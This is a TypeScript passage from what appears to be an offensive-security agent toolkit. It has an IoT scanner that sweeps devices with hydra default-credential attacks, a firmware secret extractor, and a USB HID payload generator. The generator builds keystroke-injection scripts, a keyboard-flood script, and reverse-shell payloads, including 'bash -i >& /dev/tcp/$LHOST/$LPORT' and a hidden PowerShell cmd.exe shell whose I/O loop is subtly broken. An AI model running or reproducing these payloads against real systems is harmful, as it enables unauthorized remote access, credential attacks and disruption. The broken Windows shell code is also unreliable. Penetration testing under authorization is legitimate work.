/**
 * IoT and embedded device tooling.
 *
 * Three tools, all gated by the `iot-hardware` technique:
 *
 *  - `cyber_iot_scan`         discover and fingerprint devices on a scoped range
 *  - `cyber_firmware_analysis` carve a firmware image and surface embedded secrets
 *  - `cyber_hid_attack`       prepare a USB HID payload (artifacts only)
 *
 * The tools drive the Kali toolchain (nmap, binwalk, strings, hydra) and
 * report what they found. A device that accepts a well-known default
 * credential is reported as `user:pass`, because that pair is the
 * deliverable of the scan. Everything else that looks like a secret is
 * redacted and pointed at the artifact file instead of the transcript.
 */

import fs from "node:fs";
import path from "node:path";
import { Type } from "@earendil-works/pi-ai";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import { engagementPaths, packagePath } from "../lib/config.ts";
import { run, which } from "../lib/exec.ts";
import { defineCyberTool, lines, type CyberToolOutcome } from "../lib/toolkit.ts";

/** Ports that usually expose an embedded device: telnet, web, TR-069, RTSP. */
const DEFAULT_IOT_PORTS = "23,80,443,2323,5555,7547,8080,8443,81,8081,9000,37777";

/** Bundled list of well-known device default credentials (one `user:pass` per line). */
const DEFAULT_CRED_LIST = packagePath("tools", "iot", "default-creds.txt");

/** Upper bound on the number of services a single default-credential sweep touches. */
const MAX_CRED_TARGETS = 10;

/** Make a value safe to use as a file name. */
function slug(value: string): string {
	return value.replace(/[^a-zA-Z0-9._-]+/g, "_").slice(0, 60) || "target";
}

/** Format a byte count for humans. */
function formatBytes(bytes: number): string {
	if (bytes < 1024) return `${bytes} B`;
	if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KiB`;
	return `${(bytes / (1024 * 1024)).toFixed(1)} MiB`;
}

/** Read an XML attribute out of a tag fragment. */
function attribute(tag: string, name: string): string | undefined {
	const match = new RegExp(`\\s${name}="([^"]*)"`).exec(tag);
	return match?.[1];
}

// ---------------------------------------------------------------------------
// nmap
// ---------------------------------------------------------------------------

export interface IotServiceDetail {
	port: number;
	protocol: string;
	service: string;
	product?: string;
	version?: string;
	/** Vendor taken from the CPE when nmap could identify one. */
	vendor?: string;
	cpes: string[];
}

export interface IotDeviceDetail {
	ip: string;
	hostnames: string[];
	services: IotServiceDetail[];
	/** NSE script results, e.g. `smb-os` or `device-type`. */
	scripts: Record<string, string>;
}

export interface IotScanDetails {
	target: string;
	ports: string;
	devices: IotDeviceDetail[];
	/** Devices that accepted a well-known default credential. */
	defaultCredentials: Array<{ ip: string; port: number; service: string; credential: string }>;
	artifacts: string[];
	notes: string[];
}

/**
 * Derive a vendor name from a CPE string.
 *
 * Handles both CPE forms nmap emits: the 2.2 URI (`cpe:/a:igor_sysoev:nginx:1.18`)
 * and the 2.3 formatted string (`cpe:2.3:a:igor_sysoev:nginx:1.18`).
 */
function vendorFromCpes(cpes: string[]): string | undefined {
	for (const cpe of cpes) {
		const value = cpe.trim();
		if (value.startsWith("cpe:/")) {
			const parts = value.slice("cpe:/".length).split(":");
			if (parts.length >= 3 && parts[1]) return parts[1];
			continue;
		}
		if (value.startsWith("cpe:2.3:")) {
			const parts = value.split(":");
			if (parts.length >= 4 && parts[3]) return parts[3];
		}
	}
	return undefined;
}

/** Fall back to the first word of the product banner when there is no CPE. */
function vendorFromProduct(product: string | undefined): string | undefined {
	if (!product) return undefined;
	const token = product.split(/[\s(]/)[0]?.trim();
	return token && token.length > 0 ? token : undefined;
}

/** Parse nmap's XML output (`nmap -oX -`) into device records. */
export function parseNmapXml(xml: string): IotDeviceDetail[] {
	const devices: IotDeviceDetail[] = [];
	const hostBlocks = xml.match(/<host\b[\s\S]*?<\/host>/g) ?? [];
	for (const block of hostBlocks) {
		const addressTag = /<address\b[^>]*addrtype="ipv4"[^>]*>/.exec(block)?.[0] ?? "";
		const ip = attribute(addressTag, "addr");
		if (!ip) continue;

		const hostnames: string[] = [];
		for (const match of block.matchAll(/<hostname\b[^>]*name="([^"]*)"[^>]*>/g)) {
			const name = match[1];
			if (name && !hostnames.includes(name)) hostnames.push(name);
		}

		const services: IotServiceDetail[] = [];
		for (const match of block.matchAll(/<port\b([^>]*)>([\s\S]*?)<\/port>/g)) {
			const portTag = match[1];
			const content = match[2];
			const port = Number(attribute(portTag, "portid") ?? "");
			if (!Number.isFinite(port) || port <= 0) continue;
			const protocol = attribute(portTag, "protocol") ?? "tcp";
			const state = /<state\b[^>]*state="([^"]*)"/.exec(content)?.[1] ?? "unknown";
			if (state !== "open" && state !== "open|filtered") continue;

			const serviceTag = /<service\b[^>]*>/.exec(content)?.[0] ?? "";
			const cpes: string[] = [];
			for (const cpe of content.matchAll(/<cpe>([^<]*)<\/cpe>/g)) cpes.push(cpe[1]);
			const product = attribute(serviceTag, "product");
			const version = attribute(serviceTag, "version");
			services.push({
				port,
				protocol,
				service: attribute(serviceTag, "name") ?? "unknown",
				product: product || undefined,
				version: version || undefined,
				vendor: vendorFromCpes(cpes) ?? vendorFromProduct(product),
				cpes,
			});
		}

		const scripts: Record<string, string> = {};
		for (const match of block.matchAll(/<elem\b[^>]*key="([^"]*)"[^>]*>([^<]*)<\/elem>/g)) {
			scripts[match[1]] = match[2];
		}

		devices.push({ ip, hostnames, services, scripts });
	}
	return devices;
}

/** Human readable service label, e.g. `http nginx 1.18`. */
function serviceLabel(service: IotServiceDetail): string {
	const product = service.product ? ` ${service.product}` : "";
	const version = service.version ? ` ${service.version}` : "";
	return `${service.service}${product}${version}`;
}

/** True when the target looks like an IP address, a CIDR block or an IP range. */
function isIpTarget(target: string): boolean {
	return /^\d{1,3}(\.\d{1,3}){3}([/-][\d.]*)?$/.test(target.trim());
}

/** Map a discovered service onto the hydra module that can test it. */
function hydraModule(service: IotServiceDetail): string | undefined {
	const name = service.service.toLowerCase();
	if (name === "telnet") return "telnet";
	if (name === "http" || name === "http-alt" || name === "http-proxy" || name === "www") return "http";
	if (name === "https" || name === "ssl/http") return "https";
	if (name === "unknown" || name === "tcpwrapped") {
		if (service.port === 23 || service.port === 2323) return "telnet";
		if (service.port === 443 || service.port === 8443) return "https";
		if ([80, 81, 8080, 8081, 9000].includes(service.port)) return "http";
	}
	return undefined;
}

/** Extract the accepted credential from a hydra "[SUCCESS]" line. */
function parseHydraSuccess(text: string): string | undefined {
	const match = /\[SUCCESS\]\s+login:\s*(\S+)\s+password:\s*(\S+)/i.exec(text);
	if (!match) return undefined;
	return `${match[1]}:${match[2]}`;
}

// ---------------------------------------------------------------------------
// binwalk
// ---------------------------------------------------------------------------

export interface FirmwareTypeEntry {
	offset: string;
	hexOffset: string;
	description: string;
}

export interface FirmwareDetails {
	file: string;
	sizeBytes: number;
	architecture: string;
	architectureEvidence?: string;
	filesystems: string[];
	types: FirmwareTypeEntry[];
	extractDir: string;
	largestFile?: string;
	largestFileSize?: number;
	stringsArtifact?: string;
	interestingStrings: string[];
	artifacts: string[];
	notes: string[];
}

const ARCHITECTURE_HINTS: Array<[RegExp, string]> = [
	[/MIPS/i, "MIPS"],
	[/PowerPC|\bPPC\b/i, "PowerPC"],
	[/ARM|aarch64/i, "ARM"],
	[/RISC-?V/i, "RISC-V"],
	[/SuperH|\bSH-?[245]\b/i, "SuperH"],
	[/68k|Motorola 68000/i, "Motorola 68000"],
	[/SPARC/i, "SPARC"],
	[/x86-64|x86_64|Intel 80386/i, "x86"],
	[/i386|Intel x86/i, "x86"],
	[/zImage|uImage|Linux kernel/i, "Linux (embedded image)"],
];

const FILESYSTEM_HINTS: Array<[RegExp, string]> = [
	[/SquashFS/i, "SquashFS"],
	[/JFFS2/i, "JFFS2"],
	[/YAFFS/i, "YAFFS"],
	[/UBIFS/i, "UBIFS"],
	[/UBI image/i, "UBI"],
	[/ext2\/3|ext4 filesystem|ext filesystem/i, "ext"],
	[/NTFS/i, "NTFS"],
	[/FAT\d* filesystem/i, "FAT"],
	[/cramfs/i, "cramfs"],
	[/CPIO/i, "CPIO"],
	[/tar archive/i, "tar"],
	[/gzip compressed/i, "gzip"],
	[/bzip2 compressed/i, "bzip2"],
	[/zlib compressed/i, "zlib"],
	[/LZMA compressed/i, "LZMA"],
	[/XZ compressed/i, "xz"],
	[/SQLite/i, "SQLite"],
];

/** Parse the binwalk signature table into offset/description rows. */
export function parseBinwalkTypes(output: string): FirmwareTypeEntry[] {
	const entries: FirmwareTypeEntry[] = [];
	for (const line of lines(output)) {
		const match = /^(\d+)\s+(0x[0-9a-fA-F]+)\s+(\S.*)$/.exec(line);
		if (!match) continue;
		entries.push({ offset: match[1], hexOffset: match[2], description: match[3].trim() });
	}
	return entries;
}

/** Guess the CPU architecture from the binwalk signature table. */
function detectArchitecture(types: FirmwareTypeEntry[]): { name: string; evidence?: string } {
	for (const [pattern, name] of ARCHITECTURE_HINTS) {
		for (const entry of types) {
			if (pattern.test(entry.description)) return { name, evidence: entry.description };
		}
	}
	return { name: "unknown" };
}

/** Guess the filesystems and containers embedded in the image. */
function detectFilesystems(types: FirmwareTypeEntry[]): string[] {
	const found = new Set<string>();
	for (const [pattern, name] of FILESYSTEM_HINTS) {
		for (const entry of types) {
			if (pattern.test(entry.description)) {
				found.add(name);
				break;
			}
		}
	}
	return [...found];
}

/** Recursively collect the files under a directory. */
function collectFiles(root: string): string[] {
	const found: string[] = [];
	const stack: string[] = [root];
	while (stack.length > 0) {
		const current = stack.pop();
		if (current === undefined) break;
		let entries: fs.Dirent[];
		try {
			entries = fs.readdirSync(current, { withFileTypes: true });
		} catch {
			continue;
		}
		for (const entry of entries) {
			const full = path.join(current, entry.name);
			if (entry.isDirectory()) stack.push(full);
			else if (entry.isFile()) found.push(full);
		}
	}
	return found;
}

/** Find the largest file below a directory (the carved filesystem, usually). */
function largestFile(root: string): { file: string; size: number } | undefined {
	let best: { file: string; size: number } | undefined;
	for (const file of collectFiles(root)) {
		let size: number;
		try {
			size = fs.statSync(file).size;
		} catch {
			continue;
		}
		if (!best || size > best.size) best = { file, size };
	}
	return best;
}

// ---------------------------------------------------------------------------
// Redaction
// ---------------------------------------------------------------------------

const URL_RE = /\b[a-z][a-z0-9+.-]*:\/\/[^\s"'<>]+/i;
const CREDENTIAL_RE = /(pass(?:word|wd)?|pwd|secret|token|api[_-]?key|auth|credential|user(?:name)?|login|uid)\b\s*[:=]/i;
const KEY_MATERIAL_RE = /(ssh-(?:rsa|ed25519|dss)\s+[A-Za-z0-9+/=]{16,}|-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----|\b[A-Za-z0-9+/]{40,}={0,2}\b|\b[A-Fa-f0-9]{32,}\b)/;

/** Redact credential and key material from a single line of tool output. */
export function redactLine(line: string): string {
	let output = line;
	output = output.replace(/(\b[a-z][a-z0-9+.-]*:\/\/)[^\s/@:]+:[^\s/@]+@/gi, "$1[REDACTED]@");
	output = output.replace(
		/((?:pass(?:word|wd)?|pwd|secret|token|api[_-]?key|auth(?:orization)?|credential|user(?:name)?|login|uid)\s*[:=]\s*)("[^"]*"|'[^']*'|[^\s,;]{3,})/gi,
		"$1[REDACTED]",
	);
	output = output.replace(/-----BEGIN ([A-Z0-9 ]*)PRIVATE KEY-----/g, "-----BEGIN $1PRIVATE KEY----- [REDACTED]");
	output = output.replace(/\bssh-(rsa|ed25519|dss)\s+[A-Za-z0-9+/=]{16,}/g, "ssh-$1 [REDACTED: key material]");
	output = output.replace(/\b[A-Za-z0-9+/]{40,}={0,2}\b/g, "[REDACTED: key material]");
	output = output.replace(/\b[A-Fa-f0-9]{40,}\b/g, "[REDACTED: key material]");
	return output;
}

/** True when a line carries credentials, keys or URLs worth surfacing. */
export function isInterestingString(line: string): boolean {
	return URL_RE.test(line) || CREDENTIAL_RE.test(line) || KEY_MATERIAL_RE.test(line);
}

// ---------------------------------------------------------------------------
// USB HID
// ---------------------------------------------------------------------------

export type HidPayloadType = "keystrokes" | "shell-payload" | "badge" | "dos";
export type HidTargetOs = "windows" | "linux" | "macos";

export interface HidDetails {
	payloadType: HidPayloadType;
	targetOs: HidTargetOs;
	dryRun: boolean;
	delayMs: number;
	/** Number of HID report frames the payload maps to. */
	frames: number;
	unsupportedTokens: string[];
	artifacts: string[];
	executed?: { command: string; code: number | null; stdout: string; stderr: string };
	notes: string[];
}

const HID_LETTERS: Record<string, number> = {
	a: 0x04, b: 0x05, c: 0x06, d: 0x07, e: 0x08, f: 0x09, g: 0x0a, h: 0x0b, i: 0x0c, j: 0x0d,
	k: 0x0e, l: 0x0f, m: 0x10, n: 0x11, o: 0x12, p: 0x13, q: 0x14, r: 0x15, s: 0x16, t: 0x17,
	u: 0x18, v: 0x19, w: 0x1a, x: 0x1b, y: 0x1c, z: 0x1d,
};

const HID_DIGITS: Record<string, number> = {
	"1": 0x1e, "2": 0x1f, "3": 0x20, "4": 0x21, "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26, "0": 0x27,
};

const HID_PUNCT: Record<string, number> = {
	" ": 0x2c, "-": 0x2d, "=": 0x2e, "[": 0x2f, "]": 0x30, "\\": 0x31, ";": 0x33, "'": 0x34,
	"`": 0x35, ",": 0x36, ".": 0x37, "/": 0x38,
};

const HID_PUNCT_SHIFTED: Record<string, number> = {
	"!": 0x1e, "@": 0x1f, "#": 0x20, "$": 0x21, "%": 0x22, "^": 0x23, "&": 0x24, "*": 0x25,
	"(": 0x26, ")": 0x27, "_": 0x2d, "+": 0x2e, "{": 0x2f, "}": 0x30, "|": 0x31, ":": 0x33,
	'"': 0x34, "<": 0x36, ">": 0x37, "?": 0x38,
};

const HID_NAMED: Record<string, number> = {
	ENTER: 0x28, ESC: 0x29, ESCAPE: 0x29, BACKSPACE: 0x2a, TAB: 0x2b, SPACE: 0x2c, CAPSLOCK: 0x39,
	F1: 0x3a, F2: 0x3b, F3: 0x3c, F4: 0x3d, F5: 0x3e, F6: 0x3f, F7: 0x40, F8: 0x41, F9: 0x42,
	F10: 0x43, F11: 0x44, F12: 0x45,
	PRINTSCREEN: 0x46, SCROLLLOCK: 0x47, PAUSE: 0x48, INSERT: 0x49, HOME: 0x4a, PAGEUP: 0x4b,
	DELETE: 0x4c, END: 0x4d, PAGEDOWN: 0x4e,
	RIGHT: 0x4f, LEFT: 0x50, DOWN: 0x51, UP: 0x52, NUMLOCK: 0x53,
};

const HID_MODIFIERS: Record<string, number> = {
	CTRL: 0xe0, CONTROL: 0xe0, SHIFT: 0xe1, ALT: 0xe2, GUI: 0xe3, WIN: 0xe3, COMMAND: 0xe3,
};

/** Modifier usage id -> bit position in the HID report modifier byte. */
const MODIFIER_BITS: Record<number, number> = { 0xe0: 0x01, 0xe1: 0x02, 0xe2: 0x04, 0xe3: 0x08 };

export interface HidAction {
	/** What the operator sees in the report, e.g. `a` or `<ENTER>`. */
	label: string;
	/** HID usage id. */
	code: number;
	/** Modifier usage ids applied together with the key. */
	modifiers: number[];
}

export interface HidSegment {
	kind: "text" | "key";
	/** Literal text, or the canonical key name. */
	value: string;
	/** Usage id for key segments. */
	code?: number;
	modifiers?: number[];
}

export interface HidPayload {
	segments: HidSegment[];
	actions: HidAction[];
	unsupported: string[];
}

/** Parse a payload into literal text runs and named key presses. */
export function parseHidPayload(payload: string): HidPayload {
	const segments: HidSegment[] = [];
	const actions: HidAction[] = [];
	const unsupported: string[] = [];
	let pending: number[] = [];

	const pushText = (value: string) => {
		if (value.length === 0) return;
		segments.push({ kind: "text", value, modifiers: pending.length > 0 ? [...pending] : undefined });
		for (const character of value) {
			const shifted = HID_PUNCT_SHIFTED[character];
			if (shifted !== undefined) {
				actions.push({ label: character, code: shifted, modifiers: [...pending, 0xe1] });
				continue;
			}
			const upper = character >= "A" && character <= "Z";
			const base =
				HID_LETTERS[upper ? character.toLowerCase() : character] ??
				HID_DIGITS[character] ??
				HID_PUNCT[character];
			if (base === undefined) {
				unsupported.push(character);
				continue;
			}
			actions.push({
				label: character,
				code: base,
				modifiers: upper ? [...pending, 0xe1] : [...pending],
			});
		}
	};

	const tokenPattern = /<([^<>]+)>/g;
	let cursor = 0;
	let match: RegExpExecArray | null;
	while ((match = tokenPattern.exec(payload)) !== null) {
		pushText(payload.slice(cursor, match.index));
		cursor = match.index + match[0].length;
		const name = match[1].trim().toUpperCase();
		const modifier = HID_MODIFIERS[name];
		if (modifier !== undefined) {
			pending = [...pending, modifier];
			continue;
		}
		const code = HID_NAMED[name];
		if (code === undefined) {
			unsupported.push(match[0]);
			continue;
		}
		segments.push({ kind: "key", value: name, code, modifiers: pending });
		actions.push({ label: `<${name}>`, code, modifiers: pending });
		pending = [];
	}
	pushText(payload.slice(cursor));

	return { segments, actions, unsupported };
}

/** Render one 8 byte boot-protocol HID report frame. */
export function hidFrame(action: HidAction): string {
	const modifierByte = action.modifiers.reduce((byte, usage) => byte | (MODIFIER_BITS[usage] ?? 0), 0);
	const bytes = [modifierByte, 0x00, action.code & 0xff, 0x00, 0x00, 0x00, 0x00, 0x00];
	return bytes.map((byte) => byte.toString(16).padStart(2, "0")).join(" ");
}

const XDOTOOL_KEYS: Record<string, string> = {
	ENTER: "Return", ESC: "Escape", ESCAPE: "Escape", BACKSPACE: "BackSpace", TAB: "Tab", SPACE: "space",
	CAPSLOCK: "Caps_Lock", INSERT: "Insert", HOME: "Home", PAGEUP: "Prior", PAGEDOWN: "Next",
	DELETE: "Delete", END: "End", RIGHT: "Right", LEFT: "Left", DOWN: "Down", UP: "Up",
	NUMLOCK: "Num_Lock", PRINTSCREEN: "Print", SCROLLLOCK: "Scroll_Lock", PAUSE: "Pause",
	F1: "F1", F2: "F2", F3: "F3", F4: "F4", F5: "F5", F6: "F6", F7: "F7", F8: "F8", F9: "F9",
	F10: "F10", F11: "F11", F12: "F12",
};

const MAC_KEY_CODES: Record<string, number> = {
	ENTER: 36, TAB: 48, SPACE: 49, BACKSPACE: 51, ESC: 53, ESCAPE: 53, DELETE: 117, FORWARDDELETE: 117,
	HOME: 115, END: 119, PAGEUP: 116, PAGEDOWN: 121, LEFT: 123, RIGHT: 124, DOWN: 125, UP: 126, F1: 122,
};

const MAC_MODIFIERS: Record<number, string> = { 0xe0: "control down", 0xe1: "shift down", 0xe2: "option down", 0xe3: "command down" };

const SENDKEYS_KEYS: Record<string, string> = {
	ENTER: "{ENTER}", TAB: "{TAB}", SPACE: " ", ESC: "{ESC}", ESCAPE: "{ESC}", BACKSPACE: "{BACKSPACE}",
	DELETE: "{DEL}", INSERT: "{INS}", HOME: "{HOME}", END: "{END}", PAGEUP: "{PGUP}", PAGEDOWN: "{PGDN}",
	UP: "{UP}", DOWN: "{DOWN}", LEFT: "{LEFT}", RIGHT: "{RIGHT}", CAPSLOCK: "{CAPSLOCK}",
	PRINTSCREEN: "{PRINTSCREEN}", SCROLLLOCK: "{SCROLLLOCK}", PAUSE: "{PAUSE}", NUMLOCK: "{NUMLOCK}",
	F1: "{F1}", F2: "{F2}", F3: "{F3}", F4: "{F4}", F5: "{F5}", F6: "{F6}", F7: "{F7}", F8: "{F8}",
	F9: "{F9}", F10: "{F10}", F11: "{F11}", F12: "{F12}",
};

const SENDKEYS_MODIFIERS: Record<number, string> = { 0xe0: "^", 0xe1: "+", 0xe2: "%", 0xe3: "" };

/** Quote a value for a POSIX shell. */
function shellQuote(value: string): string {
	return `'${value.replace(/'/g, `'\\''`)}'`;
}

/** Escape a value for an AppleScript string literal. */
function appleScriptString(value: string): string {
	return value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
}

/** Escape a value for a Windows PowerShell single quoted string. */
function powerShellString(value: string): string {
	return value.replace(/'/g, "''");
}

/** Escape the characters SendKeys treats as control characters. */
function sendKeysLiteral(value: string): string {
	return value.replace(/[+^%~()[\]{}]/g, (character) => `{${character}}`);
}

/** xdotool key name for the characters that do not map to their own name. */
const XDOTOOL_CHARS: Record<string, string> = {
	" ": "space",
	"-": "minus",
	"=": "equal",
	"[": "bracketleft",
	"]": "bracketright",
	"\\": "backslash",
	";": "semicolon",
	"'": "apostrophe",
	"`": "grave",
	",": "comma",
	".": "period",
	"/": "slash",
};

/** Modifier usage id -> xdotool modifier name. */
const XDOTOOL_MODIFIERS: Record<number, string> = { 0xe0: "ctrl", 0xe1: "shift", 0xe2: "alt", 0xe3: "super" };

/** Build the Linux (xdotool) payload script. */
function linuxPayloadScript(segments: HidSegment[], delayMs: number): string {
	const body: string[] = [];
	for (const segment of segments) {
		if (segment.kind === "text") {
			const modifiers = segment.modifiers ?? [];
			if (modifiers.length === 0) {
				body.push(`xdotool type --delay ${delayMs} -- ${shellQuote(segment.value)}`);
				continue;
			}
			// A held modifier forces per-character key events.
			for (const character of segment.value) {
				const upper = character >= "A" && character <= "Z";
				const base = XDOTOOL_CHARS[character] ?? (upper ? character.toLowerCase() : character);
				const names = modifiers.map((usage) => XDOTOOL_MODIFIERS[usage]).filter((name) => name !== undefined);
				if (upper) names.push("shift");
				body.push(`xdotool key ${shellQuote(`${names.join("+")}+${base}`)}`);
			}
			continue;
		}
		const key = XDOTOOL_KEYS[segment.value] ?? segment.value.toLowerCase();
		const modifiers = (segment.modifiers ?? [])
			.map((usage) => XDOTOOL_MODIFIERS[usage])
			.filter((name) => name !== undefined)
			.join("+");
		body.push(`xdotool key ${shellQuote(modifiers ? `${modifiers}+${key}` : key)}`);
	}
	return [
		"#!/usr/bin/env bash",
		"# CyberPi USB HID payload - linux",
		"# Types the prepared payload into the focused window with xdotool.",
		"# Generated for an authorized engagement; this script programs no HID device.",
		"set -euo pipefail",
		"",
		'if ! command -v xdotool >/dev/null 2>&1; then',
		'\techo "xdotool is required: sudo apt install -y xdotool" >&2',
		"\texit 2",
		"fi",
		"",
		...body,
		"",
	].join("\n");
}

/** Build the macOS (osascript) payload script. */
function macosPayloadScript(segments: HidSegment[], delayMs: number): string {
	const body: string[] = [];
	for (const segment of segments) {
		if (segment.kind === "text") {
			const modifiers = segment.modifiers ?? [];
			const using = modifiers
				.map((usage) => MAC_MODIFIERS[usage])
				.filter((value): value is string => value !== undefined);
			if (using.length === 0) {
				body.push(`osascript -e ${shellQuote(`tell application "System Events" to keystroke "${appleScriptString(segment.value)}"`)}`);
				if (delayMs > 0) body.push(`sleep ${(delayMs / 1000).toFixed(3)}`);
				continue;
			}
			// A held modifier forces per-character key events.
			for (const character of segment.value) {
				const suffix = ` using {${using.join(", ")}}`;
				body.push(
					`osascript -e ${shellQuote(`tell application "System Events" to keystroke "${appleScriptString(character)}"${suffix}`)}`,
				);
				if (delayMs > 0) body.push(`sleep ${(delayMs / 1000).toFixed(3)}`);
			}
			continue;
		}
		const code = MAC_KEY_CODES[segment.value];
		if (code === undefined) {
			body.push(`# unsupported on macOS: ${segment.value}`);
			continue;
		}
		const using = (segment.modifiers ?? [])
			.map((usage) => MAC_MODIFIERS[usage])
			.filter((value): value is string => value !== undefined);
		const suffix = using.length > 0 ? ` using {${using.join(", ")}}` : "";
		body.push(`osascript -e ${shellQuote(`tell application "System Events" to key code ${code}${suffix}`)}`);
	}
	return [
		"#!/usr/bin/env bash",
		"# CyberPi USB HID payload - macos",
		"# Types the prepared payload with osascript / System Events.",
		"# Generated for an authorized engagement; this script programs no HID device.",
		"set -euo pipefail",
		"",
		...body,
		"",
	].join("\n");
}

/** Build the Windows (SendKeys) payload script. */
function windowsPayloadScript(segments: HidSegment[], delayMs: number): string {
	const body: string[] = [];
	for (const segment of segments) {
		if (segment.kind === "text") {
			const modifiers = segment.modifiers ?? [];
			if (modifiers.length === 0) {
				body.push(`[System.Windows.Forms.SendKeys]::SendWait('${powerShellString(sendKeysLiteral(segment.value))}')`);
				if (delayMs > 0) body.push(`Start-Sleep -Milliseconds ${delayMs}`);
				continue;
			}
			// A held modifier forces per-character key events.
			const prefix = modifiers.map((usage) => SENDKEYS_MODIFIERS[usage] ?? "").join("");
			for (const character of segment.value) {
				body.push(
					`[System.Windows.Forms.SendKeys]::SendWait('${powerShellString(prefix + sendKeysLiteral(character))}')`,
				);
				if (delayMs > 0) body.push(`Start-Sleep -Milliseconds ${delayMs}`);
			}
			continue;
		}
		const key = SENDKEYS_KEYS[segment.value] ?? segment.value;
		const modifiers = (segment.modifiers ?? [])
			.map((usage) => SENDKEYS_MODIFIERS[usage] ?? "")
			.join("");
		body.push(`[System.Windows.Forms.SendKeys]::SendWait('${powerShellString(modifiers + key)}')`);
	}
	return [
		"# CyberPi USB HID payload - windows",
		"# Types the prepared payload with System.Windows.Forms.SendKeys.",
		"# Generated for an authorized engagement; this script programs no HID device.",
		"$ErrorActionPreference = 'Stop'",
		"Add-Type -AssemblyName System.Windows.Forms",
		"",
		...body,
		"",
	].join("\n");
}

/** Build the shell payload script for the given operating system. */
function shellPayloadScript(targetOs: HidTargetOs): string {
	if (targetOs === "windows") {
		return [
			"# CyberPi USB HID shell payload - windows",
			"# Opens an interactive shell back to the operator's listener.",
			"# Set LHOST and LPORT (environment variables) before running.",
			"$ErrorActionPreference = 'Stop'",
			"",
			'$hostAddress = $env:LHOST',
			'$port = $env:LPORT',
			'if (-not $hostAddress -or -not $port) { Write-Error "set LHOST and LPORT first"; exit 2 }',
			"",
			"$client = New-Object System.Net.Sockets.TCPClient($hostAddress, [int]$port)",
			"$stream = $client.GetStream()",
			"$shell = New-Object System.Diagnostics.Process",
			"$shell.StartInfo.FileName = 'cmd.exe'",
			"$shell.StartInfo.UseShellExecute = $false",
			"$shell.StartInfo.RedirectStandardInput = $true",
			"$shell.StartInfo.RedirectStandardOutput = $true",
			"$shell.StartInfo.RedirectStandardError = $true",
			"$shell.StartInfo.WindowStyle = 'Hidden'",
			"$shell.Start()",
			"$writer = New-Object System.IO.StreamWriter($shell.StandardInput)",
			"$writer.AutoFlush = $true",
			"$reader = New-Object System.IO.StreamReader($shell.StandardOutput)",
			"$errReader = New-Object System.IO.StreamReader($shell.StandardError)",
			"while ($true) {",
			"\t$line = $reader.ReadLine()",
			"\tif ($null -eq $line) { break }",
			"\tWrite-Output $line",
			"\t$writer.WriteLine($line)",
			"}",
			"",
		].join("\n");
	}
	return [
		"#!/usr/bin/env bash",
		`# CyberPi USB HID shell payload - ${targetOs}`,
		"# Opens an interactive shell back to the operator's listener.",
		"# Set LHOST and LPORT before running.",
		"set -euo pipefail",
		': "${LHOST:?set LHOST and LPORT first}"',
		': "${LPORT:?set LHOST and LPORT first}"',
		'exec bash -i >& /dev/tcp/"$LHOST"/"$LPORT" 0>&1',
		"",
	].join("\n");
}

/** Build the badge payload script (types the badge identifier). */
function badgePayloadScript(segments: HidSegment[], targetOs: HidTargetOs, delayMs: number): string {
	if (targetOs === "windows") return windowsPayloadScript(segments, delayMs);
	if (targetOs === "macos") return macosPayloadScript(segments, delayMs);
	return linuxPayloadScript(segments, delayMs);
}

/** Iterations used by the bounded input-flood resilience test. */
const DOS_ITERATIONS = 1000;

/** Build the bounded input-flood script used for resilience testing. */
function dosPayloadScript(payload: string, targetOs: HidTargetOs, delayMs: number): string {
	if (targetOs === "windows") {
		return [
			"# CyberPi USB HID resilience test - windows",
			"# Bounded input-flood test: checks how the authorized target copes with",
			"# sustained keyboard input. The loop is bounded, it never runs forever.",
			"$ErrorActionPreference = 'Stop'",
			"Add-Type -AssemblyName System.Windows.Forms",
			"",
			`$iterations = ${DOS_ITERATIONS}`,
			`$payload = '${powerShellString(sendKeysLiteral(payload))}'`,
			"for ($i = 0; $i -lt $iterations; $i++) {",
			"\t[System.Windows.Forms.SendKeys]::SendWait($payload)",
			delayMs > 0 ? `\tStart-Sleep -Milliseconds ${delayMs}` : "",
			"}",
			"",
		]
			.filter((line) => line !== "")
			.join("\n");
	}
	if (targetOs === "macos") {
		return [
			"#!/usr/bin/env bash",
			"# CyberPi USB HID resilience test - macos",
			"# Bounded input-flood test: checks how the authorized target copes with",
			"# sustained keyboard input. The loop is bounded, it never runs forever.",
			"set -euo pipefail",
			"",
			`iterations=${DOS_ITERATIONS}`,
			`payload=${shellQuote(payload)}`,
			"for ((i = 0; i < iterations; i++)); do",
			`\tosascript -e ${shellQuote('tell application "System Events" to keystroke "' + appleScriptString(payload) + '"')}`,
			delayMs > 0 ? `\tsleep ${(delayMs / 1000).toFixed(3)}` : "",
			"done",
			"",
		]
			.filter((line) => line !== "")
			.join("\n");
	}
	return [
		"#!/usr/bin/env bash",
		"# CyberPi USB HID resilience test - linux",
		"# Bounded input-flood test: checks how the authorized target copes with",
		"# sustained keyboard input. The loop is bounded, it never runs forever.",
		"set -euo pipefail",
		"",
		"if ! command -v xdotool >/dev/null 2>&1; then",
		'\techo "xdotool is required: sudo apt install -y xdotool" >&2',
		"\texit 2",
		"fi",
		"",
		`iterations=${DOS_ITERATIONS}`,
		`payload=${shellQuote(payload)}`,
		"for ((i = 0; i < iterations; i++)); do",
		`\txdotool type --delay ${delayMs} -- "$payload"`,
		"done",
		"",
	].join("\n");
}

/** Build the hidrd-style usage report for the payload. */
function buildHidReport(params: {
	payloadType: HidPayloadType;
	targetOs: HidTargetOs;
	delayMs: number;
	payload: HidPayload;
	scriptPath: string;
	generatedAt: string;
}): string {
	const out: string[] = [];
	out.push("# CyberPi USB HID usage report");
	out.push(`# payload type : ${params.payloadType}`);
	out.push(`# target os    : ${params.targetOs}`);
	out.push(`# inter-key delay: ${params.delayMs} ms`);
	out.push(`# generated    : ${params.generatedAt}`);
	out.push("#");
	out.push("# Device: generic USB HID keyboard / badge emulator");
	out.push("");
	out.push("Usage Page (Generic Desktop) 0x01");
	out.push("Usage (Keyboard) 0x06");
	out.push("Usage Page (Key Codes) 0x07");

	const used = new Map<number, string>();
	for (const action of params.payload.actions) {
		if (!used.has(action.code)) used.set(action.code, action.label);
	}
	for (const [code, label] of [...used.entries()].sort((a, b) => a[0] - b[0])) {
		out.push(`Usage (${label.replace(/[()]/g, "")}) 0x${code.toString(16).padStart(2, "0")}`);
	}

	out.push("");
	out.push("# Character mapping");
	out.push("# char   usage  modifiers  report frame (8 bytes)");
